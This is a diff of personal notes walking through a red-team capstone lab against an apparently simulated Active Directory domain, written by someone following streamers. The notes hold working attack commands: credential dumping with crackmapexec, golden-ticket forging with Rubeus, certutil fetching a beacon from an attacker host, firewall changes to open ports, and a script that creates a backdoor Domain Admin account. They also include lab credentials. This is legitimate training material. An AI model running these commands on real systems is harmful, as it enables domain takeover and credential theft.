@@ -25,18 +25,26 @@ Learnt:
 
 ![](october.png)
 
+## General Disclaimer
+
+General disclaimer, this is more a documentation of my following along with Streamers and other community member where-ever could. I am not submit this as a Write-Up I did do some of problem solving on occasions throughout, but this is more to understand how to step up to Red-Teaming and dealing with Enterprise sized networks. I am here to learn and have no really possibility of getting this done solo without a lot of time off work and more capabilities. I am hope to earn and learn some here. 
+
 - [[Red-Team-Capstone-Challenge-Notes.md]]
 - [[Red-Team-Capstone-Challenge-CMD-by-CMDs.md]]
 - [[Red-Team-Capstone-Challenge-Credentials]]
 
-General disclaimer, this is more a documentation of my following along with Streamer and other where could. I am here to learn and have no really possibility of getting this done solo without a lot of time off work and more capabilities. I am hope to earn and learn some here. 
+## Contents
 
-#### Content Creators I watched during this...
 
-- [Tib3rius - Youtube](https://www.youtube.com/@Tib3rius) / []
-- [alh4zr3d3 - Youtube](https://www.youtube.com/@alh4zr3d3) / [alh4zr3d3 - Twitch](https://www.twitch.tv/videos/1817405607)
-- [TylerRamsbey](https://www.youtube.com/@TylerRamsbey)
-	- Full playlist:  https://www.youtube.com/watch?v=xrh3g5VjY6Y&list=PLMoaZm9nyKaOrmj6SQH2b8lP6VN7Z4OD-
+#### Content Creators I watched during this ...
+
+- [Alh4zr3d3 - Youtube](https://www.youtube.com/@alh4zr3d3) / [alh4zr3d3 - Twitch](https://www.twitch.tv/videos/1817405607) 
+	- Self-Description: *"I am a professional penetration tester, red teamer, CTF player, and all-around hacker who enjoys sharing his dissociated knowledge and tainted magicks with the greater infosec community as well as drawing new members to the crazed, esoteric cult of hacking."*
+- [0xTib3rius - Youtube](https://www.youtube.com/@Tib3rius) / [0xTib3rius - Twitch](https://www.twitch.tv/0xtib3rius)
+	- Self-Description: *"I am a professional penetration tester, specializing in web application security. I wrote [AutoRecon](https://github.com/tib3rius/AutoRecon), a tool for enumerating boot2root style boxes, and I have created two Privilege Escalation courses on [Udemy](https://udemy.com/user/Tib3rius)."*
+- [Tyler Ramsbey - Youtube](https://www.youtube.com/@TylerRamsbey) / [hack_smarter Twitch](https://www.twitch.tv/hack_smarter) 
+	- Self-Description: *"I post videos on cybersecurity, education, leadership, and all things pertaining to the world of IT!"*
+	- [Full Youtube playlist](https://www.youtube.com/watch?v=xrh3g5VjY6Y&list=PLMoaZm9nyKaOrmj6SQH2b8lP6VN7Z4OD-)
 
 
 #### My Map
@@ -49,7 +57,7 @@ Firstly connecting to have a pretend domain squated email.
 
 ## OSINT  
 
-Alh4zr3d inital steps while enumerating in the background begin with crackmapexec.
+Alh4zr3d initial steps while enumerating in the background begin with `crackmapexec`.
 ```
 crackmapexec <proto> 10.200.121.0/24 -u '' -p ''
 ```
@@ -512,8 +520,11 @@ export KRB5CCNAME=$(pwd)/$ticket.ccache
 My Bloodhound data was very different so I ran it again..but then we can psremote into server01!
 ![](wecanpsremoteintoserver1.png)
 
-####  Return to take the next 17 flags!
+## Full Compromise of CORP Domain
 
+#### Return to take the next 17 flags!
+
+Watching [Alh4zr3d](https://www.twitch.tv/videos/1829218217) Stream here and there.
 ```bash
 /opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/WRK1/WRK01.bin -Loader binary -domain bing.com -obfu
 # Became:
@@ -533,19 +544,17 @@ Also it supports RC4_HMAC so we can create Skeleton Keys like the mid 2010s APT.
 And following back along with Al once re-re-re-re-hacked to the same point and improved my Sliver cheatsheet
 ![](svcScanningactuallypwned.png)
 
-Al with cme flags - Domain Cache Credentials - LSA are cached credentials stored in the registry. If 
+[Alh4zr3d](https://www.twitch.tv/videos/1829218217) comes in with cme flags - Domain Cache Credentials - LSA are cached credentials stored in the registry. If 
 ```bash
 # You have local admin
-
 proxychains4 crackmapexec smb 10.200.117.31 -u 'svcScanning' -p 'Password1!' --lsa
-
 ```
 
-
+This was an awesome moment as it opened a lot for me to do without [Alh4zr3d](https://www.twitch.tv/videos/1829218217)
 ![](cmeserv1lsaof.png)
-See [[Red-Team-Capstone-Challenge-Credentials]], the log from cme was not complete
+See [[Red-Team-Capstone-Challenge-Credentials]], the log from `cme` was not complete
 Actual password of 
-- svcBackups@corp.thereserve.loc:q9nzssaFtGHdqUV3Qv6G 
+- `svcBackups@corp.thereserve.loc:q9nzssaFtGHdqUV3Qv6G`
 
 If you have local administrator access you can decrypt these passwords in the registry, which stored encrypted it is just that we have access to the encryption that it is trivial to decrypt.
 ![](svcbackuphasdcsync-bh.png)
@@ -637,7 +646,7 @@ S-1-5-21-170228521-1485475711-3199862024 : domain SID
 Rubeus golden /aes256:899f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055 /ldap /user:t0_josh.sutton /printcmd
 ```
 
-
+The actual output
 ```go
 
 [server] sliver (EAGER_PUT) > rubeus golden /aes256:899f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055 /ldap /user:t0_josh.sutton /printcmd
@@ -725,14 +734,11 @@ c:\windows\system32\notepad.exe golden /aes256:899F996A627A04466DA18A4C09D0D7E9A
 ```
 
 Next thing I wanted to do is create the ultimate User from this ticket so that I am not other ruining anyone else on the network. 
-
-Watching Al Stream here and there.
-
 ![](dcsyncisgreaterthanmsreed.png)
 
 We need login to the DC and dc-sync another DC as that looks normal! 
 
-Certipy - 101 with Al - I used [Kali version - certifpy-ad](https://www.kali.org/tools/certipy-ad/)
+Certipy - 101 with [Alh4zr3d](https://www.twitch.tv/videos/1829218217) - I used [Kali version - certifpy-ad](https://www.kali.org/tools/certipy-ad/)
 ```bash
 # This worked a week ago
 proxychains certipy-ad find -u 'lisa.moore' -p 'Scientist2006' -dc-ip 10.200.117.102
@@ -747,7 +753,7 @@ And with the pip3 version
 Certificate Authority are setup to sign encryption, authentication, emails, TLS/SSL encrytion, governance and policy. PKI is Public Key infrastructure, Microsoft AD CS is the builtin PKI. Commonly used for generate SSL for internal certificates for internal websites.
 ![](selfsigncertificateimageforexplaination.png)
 
-Al discussed Web Enrollment is (Custom template) web-based builtin interface to enrollment, which uses NTLM authentication. Web Enrollment : Disabled - not real life, NTLM relay attack if we could. 
+[Alh4zr3d](https://www.twitch.tv/videos/1829218217) discussed Web Enrollment is (Custom template) web-based builtin interface to enrollment, which uses NTLM authentication. Web Enrollment : Disabled - not real life, NTLM relay attack if we could. 
 - Custom Templates
 - Look at Enrollment Rights
 - If we have get SYSTEM access on Server 1 then we DC because of the Enrollment rights.
@@ -791,9 +797,66 @@ proxychains impacket-wmiexec -k -no-pass -dc-ip 10.200.117.102 Administrator@COR
 ```
 ![](wmiexecontothedc.png)
 
+On the DC , I understand this is not Opsec safe, but I want flags and I have time constraints
 ```powershell
 certutil.exe -urlcache -split -f http://10.50.114.111:8443/Word.exe Word.exe
 ```
+
+#### Another Reset later..
+
+I wondered why I could download from the DC and then I guessed someone before me had reconfigure the firewall, so I added a few [rules](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/netsh-advfirewall-firewall-control-firewall-behavior). Not Opsec Safe but I need my DA account
+```powershell
+netsh advfirewall firewall add rule name= "Open Port 8443" dir=in action=allow protocol=TCP localport=8443
+netsh advfirewall firewall add rule name= "Open Port 8443" dir=out action=allow protocol=TCP localport=8443
+
+
+netsh advfirewall firewall add rule name="nvm-the-beacon" dir=in action=allow program="C:\Users\Administrator\Desktop\Word.exe" enable=yes
+```
+
+Possible the must hacky bad sysadmin red team reoccuring rake-to-facer  
+```powershell
+# Creating the ultimate Domain Admin user so I will use a Sliver shell
+import-module ActiveDirectory
+
+$pass = convertto-securestring -asplaintext -force -string "da15ADMIN#Nvm"
+New-ADUser -Name 'NVMthisAccount' -AccountPassword $pass
+
+Add-ADGroupMember -Identity "Domain Admins" -Members "NVMthisAccount"
+Add-ADGroupMember -Identity "Back Office Support" -Members "NVMthisAccount"
+Add-ADGroupMember -Identity "Development" -Members "NVMthisAccount" 
+Add-ADGroupMember -Identity "Group Policy Creator Owners" -Members "NVMthisAccount"
+Add-ADGroupMember -Identity "HR Share RW" -Members "NVMthisAccount"
+Add-ADGroupMember -Identity "Internet Access" -Members "NVMthisAccount"
+Add-ADGroupMember -Identity "Key Admins" -Members "NVMthisAccount"
+Add-ADGroupMember -Identity "Private Clients" -Members "NVMthisAccount"
+Add-ADGroupMember -Identity "Protected Users" -Members "NVMthisAccount"
+Add-ADGroupMember -Identity "Server Admins" -Members "NVMthisAccount"
+Add-ADGroupMember -Identity "Services" -Members "NVMthisAccount"
+Add-ADGroupMember -Identity "Tier 0 Admins" -Members "NVMthisAccount"
+Add-ADGroupMember -Identity "Tier 1 Admins" -Members "NVMthisAccount"
+Add-ADGroupMember -Identity "Tier 2 Admins" -Members "NVMthisAccount"
+Add-ADGroupMember -Identity "Remote Desktop Users" -Members "NVMthisAccount"
+net localgroup "Administrators" NVMthisAccount /add 
+
+net user NVMthisAccount /dom
+Get-ADGroup -filter *
+```
+
+Unpausing [Alh4zr3d](https://www.twitch.tv/videos/1829218217) to document manual AD CS abuse
+Manual CS Abuse
+
+Recon a Certificate with an RDP session
+- `Search 'MMC' -> File -> Add/Remove Snap-in -> Certificate -> Add -> $account -> 'Snap-in always manage:' Local computer -> Ok`
+- Find from `MMC` main: `Console Root -> Certificate (Local Computer) -> Trusted Root Certification Authority\ Certificates -> $yourCertInThisList -> [Left Click] to view, Edit Properties..., Copy to File...`
+- Request a new Certificate `Console Root -> Certificate (Local Computer)\Personal -> [Right Click] Request New Certificate... -> Next -> Next (Configured by you or Configured by your  administrator) -> Click to Configure settings`
+	- Subject Name:
+		- Type
+		- Value
+	- Alternative Name
+		- Type
+		- Value
+- `Enroll` 
+
 
 
 
@@ -803,7 +866,7 @@ https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windo
 
 
 
-## Full Compromise of CORP Domain
+
 
 
 ## Full Compromise of Parent Domain
